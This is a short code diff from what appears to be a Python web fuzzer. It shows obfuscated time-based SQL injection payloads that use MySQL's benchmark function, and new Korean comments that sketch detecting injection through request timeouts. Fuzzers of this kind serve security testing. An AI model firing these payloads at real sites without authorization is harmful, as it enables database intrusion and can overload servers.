@@ -94,7 +94,13 @@ class Fuzzing:
             '"/**/or/**/benchmark(7380000000*10,md5(1))/**/#"',
             '0/**/or/**/benchmark(7380000000*10,md5(1))/**/#',
         ]
-
+        # xss 함수에 있는 것 처럼 페이로드와 파라미터를 쪼개가지고 페이로드를 넣은 다음에
+        # requests.get(timeout=3)
+        # requests.post(timeout=3)
+        # try:
+        #     r = requests.get(url, timeout=3)
+        # except:
+        #     print('sqli 되는 것 같아요~~~')
         return payloads
 
 # Fuzzing('http://localhost/', Page=True, db={
